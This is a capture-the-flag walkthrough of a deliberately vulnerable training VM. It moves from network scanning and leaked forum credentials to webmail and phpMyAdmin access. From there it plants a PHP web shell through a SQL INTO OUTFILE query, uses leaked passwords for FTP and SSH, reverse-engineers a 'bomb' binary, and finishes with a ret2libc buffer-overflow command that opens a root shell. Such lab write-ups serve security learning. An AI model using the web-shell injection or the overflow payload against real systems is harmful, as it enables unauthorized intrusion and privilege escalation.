# Get the machine IP

We can simply ping all machines of the subnet, and use the ARP table to get the IP associated with the MAC address of
our machine.

The machine has as MAC address `08:00:27:e2:1b:5c` so we can run:
```bash
$ arp -a | grep 5c
? (10.11.100.56) at 8:0:27:e2:1b:5c on en0 ifscope [ethernet]
```

# Explore the IP address

Using `nmap` we can check what are the services running on that machine:
```bash
$ nmap 10.11.100.56
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-30 22:29 +00
Nmap scan report for 10.11.100.56
Host is up (0.00050s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

We can see that we have `http\https`, `ftp` and `ssh` which mean that the machine is hosting some website

Using a dictionnary of common URLs we can find that the website has the following URLs:
- https://10.11.100.56/forum
- https://10.11.100.56/phpmyadmin
- https://10.11.100.56/webmail

# Exploit the forum

On the forum there is a post about login problem (https://10.11.100.56/forum/index.php?id=6) of user `lmezard`, in that
post there is a lot of login attemps, one of them caught my attention which is a username that looks like a password
(`!q\]Ej?*5K5cy*AJ`) which most probably means that the user entered his password instead of his username.

Indeed this is a password that works when we try to login on the forum with crendentials `lmezard` : `!q\]Ej?*5K5cy*AJ`.

Once connected on the forum we can see on the `lmezard` user's page that his email is `laurie@borntosec.net`.

# Exploit the webmail

Luckly the same password works with the email found above, and we can access the mail box of `Laurie`. In the mail box
we have 2 mails, one of them contains the DB access `root/Fg-'kKXBj87E:aJ$` which we can try to use on https://10.11.100.56/phpmyadmin.

# Exploit phpmyadmin

Once connected, we don't see anything special in the database, it only contains data of the forum. But since we are connected as DB root
we can try to run some SQL queries that can help us to store scripts in the website.

We can try to store a simple script that says `hello` to see if we can execute it from the wesite using the SQL query:
```SQL
SELECT "<?php echo 'hello'; ?>" INTO OUTFILE "/var/www/forum/hello.php";
```

We find that we don't have write permissions on `/var/www/forum`, and same for `/var/www`.
The forum is using https://mylittleforum.net/, after exploring his source code we can see that there is some subfolders
inside `/forum`, after tring most of them we found out that `templates_c` has write permissions so we can run:
```SQL
SELECT "<?php echo 'hello'; ?>" INTO OUTFILE "/var/www/forum/templates_c/hello.php";
```
Thanks to that we can indeed access https://10.11.100.56/forum/templates_c/hello.php which successfully prints `hello`

We can put a file there that execute a command given from GET params like this:
```SQL
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE "/var/www/forum/templates_c/exec.php";
```
and we execute https://10.11.100.56/forum/templates_c/exec.php?c=ls%20-la%20/home
which gives us this:
```html
total 0
drwxrwx--x 1 www-data             root                  60 Oct 13  2015 .
drwxr-xr-x 1 root                 root                 220 Apr 30 22:17 ..
drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net  60 Oct 15  2015 laurie@borntosec.net
dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
```
We can see that there is some users but we have also a folder named `LOOKATME`, so let's look at it:

https://10.11.100.56/forum/templates_c/exec.php?c=ls%20-la%20/home/LOOKATME
```html
total 1
drwxr-x--- 2 www-data www-data 31 Oct  8  2015 .
drwxrwx--x 1 www-data root     60 Oct 13  2015 ..
-rwxr-x--- 1 www-data www-data 25 Oct  8  2015 password
```

It contains a file named `password` which contains `lmezard:G!@M6f4Eatau{sF"`:

https://10.11.100.56/forum/templates_c/exec.php?c=cat%20-e%20/home/LOOKATME/password
```html
lmezard:G!@M6f4Eatau{sF"$
```

When trying this password in some services it turns out that this is an `ftp` account.
```bash
$ nc 10.11.100.56 21
220 Welcome on this server
USER lmezard
331 Please specify the password.
PASS G!@M6f4Eatau{sF"
230 Login successful.
```

# Exploit ftp

Once connected to ftp using above creditentiels we found that the root contains a `README` file and an other file named
`fun`. The readme file invites us to complete the challenge related to the other file to get `laurie` ssh password.

The file contains a lot of lines that looks like C code, the most interestng part of it is:
```C
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}
```
and after looking at the functions `getmeX()`, only `getme8()` to `getme12()` has correct return value, so we need to find
what should be the return value of the remaining functions.

Each functions has a comment after it in the form of `// fileX`, checking this exact comment if it is repeated somewhere
does not bring anything. But if we check the comment that contains the next number we find a return value of a certain
character. For example for `getme7()` we found `return p;`.

Once we checked all the comments we completed te source code:
```C
char getme1() { return 'I'; }
char getme2() { return 'h'; }
char getme3() { return 'e'; }
char getme4() { return 'a'; }
char getme5() { return 'r'; }
char getme6() { return 't'; }
char getme7() { return 'p'; }
char getme8() { return 'w'; }
char getme9() { return 'n'; }
char getme10() { return 'a'; }
char getme11() { return 'g'; }
char getme12() { return 'e'; }
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}
```

So the password is `SHA256("Iheartpwnage")` which is `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.

# Exploit user laurie with SSH

Once connected over ssh to user `laurie`, we found a `README` file with hints to get password of user `thor` and a binary
called `bomb`. We have to diffuse the bomb to get the password and we only have one life.

# Exploit bomb binary

We can explore the binary using GDB:
  * In the first phase we simply have to enter the string `Public speaking is very easy.`
  * In the second phase we are invited to enter 6 numbers, which should be the first 6 factorials `1 2 6 24 120 720`
  * In the third phase we have to enter 2 numbers and a character between them (`"%d %c %d"`) which are `1 b 214` based on the hint
  * In the forth phase we compare if the output of `func4` is `55`, predicted that is comuputing fibonacci then if it's
  	the we should give `9` and indeed we pass the phase with `9`.
  * In the fifth phase we expect that the given string is equal to `giants` after doing some modifications on it. If we look at the code
    there is an array that correspond a letter to every alphabetic letter `"isrveawhobpnutfg"` (modulo `16`) which gives `opekmq` as answer
  * In the last phase we are again invited to read 6 numbers. Basically it checks if all numbers are less or equal to `6` and distinct and do some
    other operations, at the end it turns out that the combination is `4 2 6 3 1 5`

After finishing all steps the password is the concatenation of every step without spaces: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

# Exloit user thor with SSH

Once connected we find instructions in a file named `turtle` that will give us password for user `zaz`.
After following the instructions we found that it draws letter which are `SLASH`, at the end of the instructions we have a message
`Can you digest the message? :)` which means that we have to apply `MD5` on that word. The password is `646da671ca01bb5d84dbb5fb2238dc8e`

# Exloit user zaz sith SSH

Once connected we find a folder named `mail` that contains empty folders and log messages with unreadable content, and a binary
named `exloit_me`. When running the binary wihtout arguments is does nothing but if we give an argument it prints it back.
Giving more arguments does not change things

First idea that cames in mind is to see if we can overflow the input, which happens when we give more than `139` characters. We can then
erase then call `system("/bin/sh")` with the following command:
```bash
$ ./exploit_me $(python -c "print('0' * 140 + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7')")
'\x58\xcc\xf8\xb7')"`
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`��AAAAX��
# whoami
root
```

`'\x60\xb0\xe6\xb7'` is the address of `system` and `\x58\xcc\xf8\xb7'` is the address of `"/bin/sh"`

We can then go to root home directory and find a `README`:
```bash
# cd /root
# ls
README
# cat README
CONGRATULATIONS !!!!
To be continued...
```
